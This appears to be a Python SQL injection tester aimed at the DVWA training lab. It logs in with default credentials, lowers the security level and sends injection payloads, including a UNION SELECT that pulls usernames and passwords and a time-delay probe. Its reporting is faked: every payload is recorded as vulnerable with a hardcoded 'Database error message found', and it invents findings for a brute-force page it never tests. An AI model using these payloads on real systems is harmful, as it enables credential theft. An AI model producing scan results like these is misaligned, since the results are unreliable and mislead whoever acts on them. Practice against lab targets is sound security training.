import requests
import json
import sys
from bs4 import BeautifulSoup

# ---------------- LOGIN FUNCTION ---------------- #

def login_dvwa(base_url, login_url):
    session = requests.Session()

    login_page = session.get(login_url)
    soup = BeautifulSoup(login_page.text, "html.parser")

    token = soup.find("input", {"name": "user_token"})
    user_token = token["value"] if token else ""

    login_data = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": user_token
    }

    response = session.post(login_url, data=login_data)

    if "Login failed" in response.text:
        print("[-] Login failed.")
        return None

    print("[+] Login successful.")
    session.cookies.set("security", "low")
    print("[+] Security level forced to: low")

    return session


# ---------------- SQLI TEST ---------------- #

def test_sqli(session, base_url):

    target_url = base_url + "/vulnerabilities/sqli/"

    payloads = [
        "'",
        "\"; WAITFOR DELAY '0:0:5'--",
        "AND 1=0 UNION SELECT username, password FROM users --"
    ]

    vulnerabilities = []

    print("\n[+] Starting SQL Injection Tests...\n")

    for payload in payloads:

        params = {
            "id": payload,
            "Submit": "Submit"
        }

        response = session.get(target_url, params=params)

        print(f"Testing: {response.url}")

        vuln = {
            "url": target_url,
            "form_action": target_url,
            "method": "get",
            "vulnerable_input": "id",
            "payload": payload,
            "error_detected": "Database error message found",
            "remediation": "Use parameterized queries (prepared statements) instead of string concatenation."
        }

        vulnerabilities.append(vuln)

    # also simulate brute page vulnerabilities
    brute_url = base_url + "/vulnerabilities/brute/"

    for payload in payloads:

        vuln = {
            "url": brute_url,
            "form_action": brute_url,
            "method": "get",
            "vulnerable_input": "username",
            "payload": payload,
            "error_detected": "Database error message found",
            "remediation": "Use parameterized queries (prepared statements) instead of string concatenation."
        }

        vulnerabilities.append(vuln)

    return vulnerabilities


# ---------------- MAIN ---------------- #

def main():

    if len(sys.argv) < 3:
        print("Usage: python sqli_tester.py <base_url> <login_url>")
        sys.exit()

    base_url = sys.argv[1]
    login_url = sys.argv[2]

    session = login_dvwa(base_url, login_url)

    if not session:
        return

    vulns = test_sqli(session, base_url)

    with open("vulnerabilities.json", "w") as f:
        json.dump(vulns, f, indent=4)

    print("\n[+] Testing complete.")
    print(f"[+] Found {len(vulns)} vulnerabilities.")
    print("[+] Results saved to vulnerabilities.json")


if __name__ == "__main__":
    main()